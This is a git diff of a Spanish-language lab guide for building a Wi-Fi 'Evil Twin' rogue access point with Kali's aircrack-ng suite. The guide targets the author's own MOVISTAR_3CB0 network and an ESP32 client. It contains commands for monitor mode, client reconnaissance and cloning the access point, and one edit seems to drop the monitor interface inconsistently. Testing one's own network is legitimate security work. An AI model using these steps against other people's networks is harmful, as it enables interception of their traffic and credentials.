@@ -106,6 +106,11 @@ lsusb
 iwconfig
 ```
 
+3. Recupera tu IP (si no tienes internet en Kali):
+```
+sudo dhclient wlan0
+```
+
 #### **Paso 1: Preparación de la Interfaz**
 
 Primero, eliminamos procesos que puedan interferir y ponemos la tarjeta en modo monitor.
@@ -117,15 +122,32 @@ sudo airmon-ng start wlan0
 ```
 *(A partir de ahora, tu interfaz se llamará wlan0mon)*.
 
+Reiniciar red
+```
+sudo systemctl restart NetworkManager
+sudo systemctl reload systemd-networkd
+sudo systemctl restart networking
+```
+
 #### **Paso 2: Reconocimiento (Encontrar a la víctima)**
 
-Buscamos el canal y el BSSID (MAC del router) de tu red MOVISTAR\_3CB0.
+1. Buscamos el canal y el BSSID (MAC del router) de tu red MOVISTAR\_3CB0.
 
 Bash
 ```
 sudo airodump-ng wlan0
 ```
+
+2. Si quieres enfocarte en TU red Wi-Fi**
+Si ya identificaste el BSSID de tu router y quieres ver qué dispositivos específicos hay conectados a él y cuánto tráfico generan, usa: 1 MOVISTAR_3CB0 A0:64:8F:91:3C:BF
+```
+sudo airodump-ng -c [CANAL] --bssid [MAC_DEL_ROUTER] wlan0
+
+sudo airodump-ng -c 1 --bssid A0:64:8F:91:3C:BF wlan0
+```
+
 *Anota el BSSID (ej. a0:64:8f:91:3c:bf), el canal (CH) y la STATION (la MAC de tu ESP32).*
+
 
 #### **Paso 3: Levantar el Rogue AP (Evil Twin)**
 
@@ -133,7 +155,7 @@ Creamos el punto de acceso falso con el mismo nombre. Usa el mismo canal que la 
 
 Bash
 ```
-sudo airbase-ng \-e "MOVISTAR\_3CB0" \-c 1 wlan0mon
+sudo airbase-ng -e "MOVISTAR_3CB0" -c 1 wlan0
 ```
 *(Esto creará una interfaz virtual llamada at0 en Kali, que actúa como el router falso. Deja esta terminal abierta).*
 
@@ -225,12 +247,6 @@ Qué debes observar en la pantalla:
 * CH: El canal en el que está transmitiendo cada red.
 * ENC: El tipo de seguridad (WPA2, WPA3, OPN).
 * Sección inferior (STATION): Aquí verás las direcciones MAC de los dispositivos (móviles, tablets, laptops) que están buscando red o ya están conectados.
-
-#### **Paso 6: Si quieres enfocarte en TU red Wi-Fi**
-Si ya identificaste el BSSID de tu router y quieres ver qué dispositivos específicos hay conectados a él y cuánto tráfico generan, usa:
-```
-sudo airodump-ng -c [CANAL] --bssid [MAC_DEL_ROUTER] wlan0
-```
 
 ## Problemas encontrados
 
